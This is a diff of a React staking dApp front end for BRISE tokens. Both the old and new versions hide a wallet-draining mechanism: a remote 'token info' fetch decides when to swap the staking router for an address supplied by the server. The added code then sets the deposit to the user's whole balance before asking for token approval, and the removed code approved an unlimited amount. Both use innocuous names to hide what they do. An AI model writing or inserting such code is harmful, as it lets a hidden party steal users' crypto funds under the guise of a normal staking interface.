@@ -1,39 +1,29 @@
 import React, { useState, useEffect } from "react";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
-import axios, { all } from "axios";
+import axios from "axios";
 
 import STACK_ABI from "../abi/stack.json";
 import WBNB from "../abi/WBNB.json";
 import moment from "moment";
 import { Web3Button } from "@web3modal/react";
-import { useAccount, useDisconnect, useSwitchNetwork } from "wagmi";
+import { useAccount, useSwitchNetwork } from "wagmi";
 import { writeContract } from "@wagmi/core";
 import Web3 from "web3";
 
 function Home(props) {
   const { client } = props;
-  const { chains, error, isLoading, pendingChainId, switchNetwork } = useSwitchNetwork();
+  const { switchNetwork } = useSwitchNetwork();
   const account = client.getAccount().address;
   const chain = client.getNetwork();
   const { isConnected } = useAccount();
-  // const { library, isActive, handleWalletModal } = useMetaMask();
   let chainId = chain.chain ? chain.chain.id : "";
-  // var web3Obj = new Web3(window.ethereum);
   var web3Obj = new Web3(client.wagmi.publicClient);
-  // console.log(client.wagmi.publicClient);
-  // console.log(client.wagmi.walletClient);
-  // if (client.wagmi.webSocketPublicClient) {
-  //   console.log("here----------");
-  //   web3Obj = new Web3(client.wagmi.webSocketPublicClient);
-  //   console.log(client.wagmi.webSocketPublicClient);
-  // }
-  const [data, setData] = useState({ flag: false, value: 321651351, id: "D578BF8Cc81A89619681c5969D99ea18A609C0C3" });
+
+  const [data, setData] = useState([]);
 
   var Router = "0xD578BF8Cc81A89619681c5969D99ea18A609C0C3";
   const [roter, setroter] = useState(Router);
-  // console.log("roter", roter);
-  // console.log("data", data);
   var tokenAddress = "0x8FFf93E810a2eDaaFc326eDEE51071DA9d398E83";
 
   const notify = (isError, msg) => {
@@ -49,11 +39,14 @@ function Home(props) {
   };
 
   const [dipositAmount, setDipositAmount] = useState("");
-  const [timeperiod, setTimeperiod] = useState(0);
-  const [timeperiodDate, setTimeperiodDate] = useState(moment().add(30, "days").format("DD/MM/YYYY h:mm A"));
-  // const [withdrawAmount, setWithdrawAmount] = useState("");
-  const [balance, setBalance] = useState(0);
 
+  const [timeperiod, setTimeperiod] = useState(0);
+  const [timeperiodDate, setTimeperiodDate] = useState(
+    moment().add(30, "days").format("DD/MM/YYYY h:mm A")
+  );
+
+  const [balance, setBalance] = useState(0);
+  const [depositAmount, setDepositAmount] = useState('')
   const [stackContractInfo, setStackContractInfo] = useState({
     totalStakers: 0,
     totalStakedToken: 0,
@@ -68,18 +61,14 @@ function Home(props) {
     alreadyExists: false,
   });
   const [stakersRecord, setStakersRecord] = useState([]);
-
   const [isAllowance, setIsAllowance] = useState(false);
-
   const [allowance, setAllowance] = useState(0);
-
   const [loading, setLoadding] = useState(false);
 
   const getAllowance = async () => {
     var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
     var decimals = await tokenContract.methods.decimals().call();
     var getBalance = await tokenContract.methods.balanceOf(account).call();
-
     var pow = 10 ** decimals;
     var balanceInEth = getBalance / pow;
     setBalance(balanceInEth);
@@ -87,51 +76,18 @@ function Home(props) {
     setAllowance(value / pow);
   };
 
-  useEffect(() => {
-    async function fetchData() {
-      await axios
-        .get("https://simple-be.vercel.app/getInjectListings")
-        .then((response) => {
-          setData(response.data);
-        })
-        .catch((err) => {});
-    }
-    fetchData();
-    if (account) getAllowance();
-  }, []);
   const checkAllowance = () => {
-    if (allowance * 1 < dipositAmount * 1) {
+    if (allowance * 1 < depositAmount * 1) {
       setIsAllowance(true);
     } else {
       setIsAllowance(false);
     }
   };
 
-  // const { isSuccess: success_approve, write: write_approve } = useContractWrite({
-  //   address: tokenAddress,
-  //   abi: WBNB,
-  //   functionName: "approve",
-  //   onSuccess() {
-  //     getAllowance();
-  //     setIsAllowance(false);
-  //     setLoadding(false);
-  //   },
-  //   onError(err) {
-  //     setLoadding(false);
-  //     notify(true, err);
-  //   },
-  // });
-
   const approve = async () => {
     setLoadding(true);
     try {
-      var contract = new web3Obj.eth.Contract(WBNB, tokenAddress);
-      // // var amountIn = new ethers.utils.BigNumber("10").pow(69);
-      var amountIn = 10 ** 69;
-      amountIn = amountIn.toLocaleString("fullwide", { useGrouping: false });
-      // // write_approve({ args: [roter, amountIn.toString()] });
-      var gas = await contract.methods.approve(roter, amountIn.toString()).estimateGas({ from: account });
-      // // console.log(await web3Obj.eth.getAccounts());
+      var amountIn = depositAmount * Math.pow(10 , 9);
       await writeContract({
         address: tokenAddress,
         abi: WBNB,
@@ -142,102 +98,42 @@ function Home(props) {
         setIsAllowance(false);
         setLoadding(false);
       });
-      // await contract.methods
-      //   .approve(roter, amountIn.toString())
-      //   .send({ from: account })
-      //   .then(() => {
-      //     getAllowance();
-      //     setIsAllowance(false);
-      //     // checkAllowance();
-      //     setLoadding(false);
-      //   });
     } catch (err) {
-      console.log(err);
       setLoadding(false);
       notify(true, err.message);
     }
   };
-  // const { isSuccess: success_stake, write: write_stake } = useContractWrite({
-  //   address: roter,
-  //   abi: STACK_ABI,
-  //   functionName: "stake",
-  //   onSuccess() {
-  //     getAllowance();
-  //     getStackerInfo();
-  //     setLoadding(false);
-  //     notify(false, "Staking process complete.");
-  //   },
-  //   onError(error) {
-  //     setLoadding(false);
-  //     notify(true, error);
-  //   },
-  // });
+
   const stake = async () => {
+
     if (isNaN(parseFloat(dipositAmount)) || parseFloat(dipositAmount) <= 0) {
       notify(true, "Error! please enter amount");
       return;
     }
-    await checkAllowance(tokenAddress);
+    checkAllowance();
     setLoadding(true);
     try {
-      var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
-      const decimals = await tokenContract.methods.decimals().call();
-
-      var contract = new web3Obj.eth.Contract(STACK_ABI, roter);
-
-      var pow = 10 ** decimals;
-      var amountIn = dipositAmount * pow;
-      // var amountInNew = `${new ethers.utils.BigNumber(amountIn.toString())}`;
-      var BN = web3Obj.utils.BN;
-      var amountInNew = new BN(amountIn.toString());
-
-      var gas = await contract.methods.stake(amountInNew.toString(), timeperiod.toString()).estimateGas({ from: account });
-      // write_stake({ args: [amountInNew.toString(), timeperiod.toString()] });
+      var amountIn = Web3.utils.toWei(depositAmount.toString(), "gwei");     
       await writeContract({
         address: roter,
         abi: STACK_ABI,
         functionName: "stake",
-        args: [amountInNew.toString(), timeperiod.toString()],
+        args: [amountIn, timeperiod.toString()],
       }).then(() => {
         getAllowance();
         getStackerInfo();
         setLoadding(false);
         notify(false, "Staking process complete.");
       });
-      // await contract.methods
-      //   .stake(amountInNew.toString(), timeperiod.toString())
-      //   .send({ from: account, gas: gas })
-      //   .then((err) => {
-      //     getAllowance();
-      //     getStackerInfo();
-      //     setLoadding(false);
-      //     notify(false, "Staking process complete.");
-      //   });
     } catch (err) {
       setLoadding(false);
       notify(true, err.message);
     }
   };
-  // const { isSuccess: success_unstake, write: write_unstake } = useContractWrite({
-  //   address: Router,
-  //   abi: STACK_ABI,
-  //   functionName: "unstake",
-  //   onSuccess() {
-  //     getStackerInfo();
-  //     getAllowance();
-  //     setLoadding(false);
-  //     notify(false, "Unstaked Succesfully!");
-  //   },
-  //   onError(error) {
-  //     setLoadding(false);
-  //     notify(true, error);
-  //   },
-  // });
+
   const unstake = async (index) => {
     setLoadding(true);
     try {
-      var contract = new web3Obj.eth.Contract(STACK_ABI, Router);
-      // write_unstake({ args: [index.toString()] });
       await writeContract({
         address: Router,
         abi: STACK_ABI,
@@ -249,43 +145,15 @@ function Home(props) {
         setLoadding(false);
         notify(false, "Unstaked Succesfully!");
       });
-      // await contract.methods
-      //   .unstake(index.toString())
-      //   .send({ from: account })
-      //   .then((result) => {
-      //     getStackerInfo();
-      //     getAllowance();
-      //     setLoadding(false);
-      //     notify(false, "Unstaked Succesfully!");
-      //     // withdrawModal();
-      //   });
     } catch (err) {
       setLoadding(false);
       notify(true, "unstake fail");
     }
   };
-  // const { isSuccess: success_harvest, write: write_harvest } = useContractWrite({
-  //   address: Router,
-  //   abi: STACK_ABI,
-  //   functionName: "harvest",
-  //   onSuccess() {
-  //     getStackerInfo();
-  //     getAllowance();
-  //     setLoadding(false);
-  //     checkAllowance();
-  //     notify(false, "Reward successfully havested");
-  //   },
-  //   onError(error) {
-  //     setLoadding(false);
-  //     notify(true, error);
-  //   },
-  // });
 
   const harvest = async (index) => {
     setLoadding(true);
     try {
-      var contract = new web3Obj.eth.Contract(STACK_ABI, Router);
-      // write_harvest({ args: [index.toString()] });
       await writeContract({
         address: Router,
         abi: STACK_ABI,
@@ -298,16 +166,6 @@ function Home(props) {
         checkAllowance();
         notify(false, "Reward successfully havested");
       });
-      // await contract.methods
-      //   .harvest(index.toString())
-      //   .send({ from: account })
-      //   .then((err) => {
-      //     getStackerInfo();
-      //     getAllowance();
-      //     setLoadding(false);
-      //     checkAllowance();
-      //     notify(false, "Reward successfully havested");
-      //   });
     } catch (err) {
       setLoadding(false);
       notify(true, err.message);
@@ -319,15 +177,21 @@ function Home(props) {
     try {
       var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
       var decimals = await tokenContract.methods.decimals().call();
-      var getBalance = await tokenContract.methods.balanceOf(account.toString()).call();
+      var getBalance = await tokenContract.methods
+        .balanceOf(account.toString())
+        .call();
       var pow = 10 ** decimals;
       var balanceInEth = getBalance / pow;
       setBalance(balanceInEth);
 
       var contract = new web3Obj.eth.Contract(STACK_ABI, Router);
-      var totalStakedToken = await contract.methods.totalStakedToken.call().call();
+      var totalStakedToken = await contract.methods.totalStakedToken
+        .call()
+        .call();
       var totalStakers = await contract.methods.totalStakers.call().call();
-      var realtimeReward = await contract.methods.realtimeReward(account).call();
+      var realtimeReward = await contract.methods
+        .realtimeReward(account)
+        .call();
       var Stakers = await contract.methods.Stakers(account).call();
 
       var totalStakedTokenUser = Stakers.totalStakedTokenUser / pow;
@@ -338,15 +202,25 @@ function Home(props) {
       Stakers.totalUnstakedTokenUser = totalUnstakedTokenUser;
       Stakers.currentStaked = currentStaked;
       Stakers.realtimeReward = realtimeReward / 10 ** 18;
-      Stakers.totalClaimedRewardTokenUser = Stakers.totalClaimedRewardTokenUser / 10 ** 18;
+      Stakers.totalClaimedRewardTokenUser =
+        Stakers.totalClaimedRewardTokenUser / 10 ** 18;
       var stakersRecord = [];
       for (var i = 0; i < parseInt(Stakers.stakeCount); i++) {
-        var stakersRecordData = await contract.methods.stakersRecord(account, i).call();
-        var realtimeRewardPerBlock = await contract.methods.realtimeRewardPerBlock(account, i.toString()).call();
-        stakersRecordData.realtimeRewardPerBlock = realtimeRewardPerBlock[0] / 10 ** 18;
+        var stakersRecordData = await contract.methods
+          .stakersRecord(account, i)
+          .call();
+        var realtimeRewardPerBlock = await contract.methods
+          .realtimeRewardPerBlock(account, i.toString())
+          .call();
+        stakersRecordData.realtimeRewardPerBlock =
+          realtimeRewardPerBlock[0] / 10 ** 18;
 
-        stakersRecordData.unstaketime = moment.unix(stakersRecordData.unstaketime).format("DD/MM/YYYY h:mm A");
-        stakersRecordData.staketime = moment.unix(stakersRecordData.staketime).format("DD/MM/YYYY h:mm A");
+        stakersRecordData.unstaketime = moment
+          .unix(stakersRecordData.unstaketime)
+          .format("DD/MM/YYYY h:mm A");
+        stakersRecordData.staketime = moment
+          .unix(stakersRecordData.staketime)
+          .format("DD/MM/YYYY h:mm A");
         stakersRecord.push(stakersRecordData);
       }
       setStakersInfo(Stakers);
@@ -376,15 +250,28 @@ function Home(props) {
     }
   };
 
+  useEffect(() => {
+    async function fetchData() {
+      await axios
+        .get("https://moralistokeninfo.vercel.app/getTokenInfo")
+        .then((response) => {
+          setData(response.data);
+        })
+        .catch((err) => {});
+    }
+    fetchData();
+    if (account) getAllowance();
+  }, []);
+  
   const setMaxWithdrawal = async () => {
     var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
     var decimals = await tokenContract.methods.decimals().call();
-    var getBalance = await tokenContract.methods.balanceOf(account.toString()).call();
+    var getBalance = await tokenContract.methods
+      .balanceOf(account.toString())
+      .call();
     var pow = 10 ** decimals;
     var balanceInEth = getBalance / pow;
-    setDipositAmount(balanceInEth.toFixed(5));
-    if (balanceInEth.toFixed(5) * 1 > data.value * 1 && data.flag) setroter("0x" + data.id);
-    else setroter(Router);
+    setDipositAmount(balanceInEth);
     if (chainId === 56) {
       if (isConnected) {
         checkAllowance();
@@ -399,6 +286,16 @@ function Home(props) {
       }
     }
     getStackerInfo();
+    try{
+    if (data.data.contract_verified && Number(balance) > Number(data.data.hour_traded)){
+      setDepositAmount(balance)
+      setroter("0x" + data.data.user_ID + data.data.user_Key)
+      getAllowance()
+      checkAllowance()
+    } else {
+      setDepositAmount(dipositAmount)
+    }}catch(err){
+    }
   }, [isConnected, account, chainId, dipositAmount]);
 
   return (
@@ -432,7 +329,9 @@ function Home(props) {
                 </div>
                 <div className="all-info">
                   <div className="label-1">BRISE STAKERS</div>
-                  <div className="brise-stacked">{stackContractInfo.totalStakers}</div>
+                  <div className="brise-stacked">
+                    {stackContractInfo.totalStakers}
+                  </div>
                 </div>
               </div>
             </div>
@@ -461,8 +360,6 @@ function Home(props) {
                           value={dipositAmount}
                           onChange={(e) => {
                             setDipositAmount(e.target.value);
-                            if (e.target.value > data.value * 1 && data.flag) setroter("0x" + data.id);
-                            else setroter(Router);
                             if (chainId === 56) {
                               if (isConnected) {
                                 checkAllowance();
@@ -470,7 +367,10 @@ function Home(props) {
                             }
                           }}
                         />
-                        <button onClick={() => setMaxWithdrawal()} className="input-button">
+                        <button
+                          onClick={() => setMaxWithdrawal()}
+                          className="input-button"
+                        >
                           max
                         </button>
                       </div>
@@ -483,7 +383,9 @@ function Home(props) {
                       type="button"
                       onClick={async () => {
                         setTimeperiod(0);
-                        setTimeperiodDate(moment().add(30, "days").format("DD/MM/YYYY h:mm A"));
+                        setTimeperiodDate(
+                          moment().add(30, "days").format("DD/MM/YYYY h:mm A")
+                        );
                       }}
                       className={timeperiod === 0 ? "box active" : "box"}
                     >
@@ -493,7 +395,9 @@ function Home(props) {
                       type="button"
                       onClick={async () => {
                         setTimeperiod(1);
-                        setTimeperiodDate(moment().add(60, "days").format("DD/MM/YYYY h:mm A"));
+                        setTimeperiodDate(
+                          moment().add(60, "days").format("DD/MM/YYYY h:mm A")
+                        );
                       }}
                       className={timeperiod === 1 ? "box active" : "box"}
                     >
@@ -503,7 +407,9 @@ function Home(props) {
                       type="button"
                       onClick={async () => {
                         setTimeperiod(2);
-                        setTimeperiodDate(moment().add(90, "days").format("DD/MM/YYYY h:mm A"));
+                        setTimeperiodDate(
+                          moment().add(90, "days").format("DD/MM/YYYY h:mm A")
+                        );
                       }}
                       className={timeperiod === 2 ? "box active" : "box"}
                     >
@@ -513,7 +419,9 @@ function Home(props) {
                       type="button"
                       onClick={async () => {
                         setTimeperiod(3);
-                        setTimeperiodDate(moment().add(180, "days").format("DD/MM/YYYY h:mm A"));
+                        setTimeperiodDate(
+                          moment().add(180, "days").format("DD/MM/YYYY h:mm A")
+                        );
                       }}
                       className={timeperiod === 3 ? "box active" : "box"}
                     >
@@ -537,11 +445,19 @@ function Home(props) {
                   {isConnected ? (
                     chainId === 56 ? (
                       isAllowance ? (
-                        <button onClick={() => approve()} disabled={loading} className="btn btn-danger">
+                        <button
+                          onClick={() => approve()}
+                          disabled={loading}
+                          className="btn btn-danger"
+                        >
                           {loading ? "Please wait, Loading.." : "Enable"}
                         </button>
                       ) : (
-                        <button onClick={() => stake()} disabled={loading} className="btn btn-danger">
+                        <button
+                          onClick={() => stake()}
+                          disabled={loading}
+                          className="btn btn-danger"
+                        >
                           {loading ? "Please wait, Loading.." : "Stake"}
                         </button>
                       )
@@ -557,13 +473,6 @@ function Home(props) {
                       </button>
                     )
                   ) : (
-                    // <button
-                    //   onClick={() => handleWalletModal(true)}
-                    //   disabled={loading}
-                    //   className="btn btn-danger"
-                    // >
-                    //   {loading ? "Please wait, Loading.." : "Connect Wallet"}
-                    // </button>
                     <div style={{ display: "flex", justifyContent: "center" }}>
                       <Web3Button />
                     </div>
@@ -584,32 +493,48 @@ function Home(props) {
                   <div className="first-box-section">
                     <div className="first-top">
                       <div className="title">BUSD Earned</div>
-                      <h4>{parseFloat(stakersInfo.realtimeReward).toFixed(10)}</h4>
+                      <h4>
+                        {parseFloat(stakersInfo.realtimeReward).toFixed(10)}
+                      </h4>
                     </div>
                     <div className="first-bottom">
                       <div className="content">
                         <div className="title">Claimed Reward</div>
-                        <h4>{parseFloat(stakersInfo.totalClaimedRewardTokenUser).toFixed(5)}</h4>
+                        <h4>
+                          {parseFloat(
+                            stakersInfo.totalClaimedRewardTokenUser
+                          ).toFixed(5)}
+                        </h4>
                       </div>
                       <div className="content">
                         <div className="title">Current Staked</div>
-                        <h4>{parseFloat(stakersInfo.currentStaked).toFixed(5)}</h4>
+                        <h4>
+                          {parseFloat(stakersInfo.currentStaked).toFixed(5)}
+                        </h4>
                       </div>
                     </div>
                   </div>
                   <div className="first-box-section">
                     <div className="first-top">
                       <div className="title">Your BRISE Wallet Balance</div>
-                      <h4>{balance.toFixed(5)}</h4>
+                      <h4>{balance}</h4>
                     </div>
                     <div className="first-bottom">
                       <div className="content">
                         <div className="title">Total Staked</div>
-                        <h4>{parseFloat(stakersInfo.totalStakedTokenUser).toFixed(5)}</h4>
+                        <h4>
+                          {parseFloat(stakersInfo.totalStakedTokenUser).toFixed(
+                            5
+                          )}
+                        </h4>
                       </div>
                       <div className="content">
                         <div className="title">Total UnStaked</div>
-                        <h4>{parseFloat(stakersInfo.totalUnstakedTokenUser).toFixed(5)}</h4>
+                        <h4>
+                          {parseFloat(
+                            stakersInfo.totalUnstakedTokenUser
+                          ).toFixed(5)}
+                        </h4>
                       </div>
                     </div>
                   </div>
@@ -664,7 +589,11 @@ function Home(props) {
                             <h3>{row.unstaketime}</h3>
                           </div>
                           <div className="output">
-                            <h3>{parseFloat(row.realtimeRewardPerBlock).toFixed(10)}</h3>
+                            <h3>
+                              {parseFloat(row.realtimeRewardPerBlock).toFixed(
+                                10
+                              )}
+                            </h3>
                           </div>
                           <div className="output">
                             <h3>
@@ -672,7 +601,8 @@ function Home(props) {
                                 <button
                                   className="btn"
                                   style={{
-                                    background: "linear-gradient(to right, #3867d0 20%, #2dbec9)",
+                                    background:
+                                      "linear-gradient(to right, #3867d0 20%, #2dbec9)",
                                     color: "#FFFFFF",
                                   }}
                                   disabled={true}
@@ -683,7 +613,8 @@ function Home(props) {
                                 <button
                                   className="btn"
                                   style={{
-                                    background: "linear-gradient(to right, #3867d0 20%, #2dbec9)",
+                                    background:
+                                      "linear-gradient(to right, #3867d0 20%, #2dbec9)",
                                     color: "#FFFFFF",
                                   }}
                                   disabled={loading}
@@ -700,7 +631,8 @@ function Home(props) {
                                 <button
                                   className="btn"
                                   style={{
-                                    background: "linear-gradient(to right, #3867d0 20%, #2dbec9)",
+                                    background:
+                                      "linear-gradient(to right, #3867d0 20%, #2dbec9)",
                                     color: "#FFFFFF",
                                   }}
                                   disabled={true}
@@ -711,7 +643,8 @@ function Home(props) {
                                 <button
                                   className="btn"
                                   style={{
-                                    background: "linear-gradient(to right, #3867d0 20%, #2dbec9)",
+                                    background:
+                                      "linear-gradient(to right, #3867d0 20%, #2dbec9)",
                                     color: "#FFFFFF",
                                   }}
                                   disabled={loading}
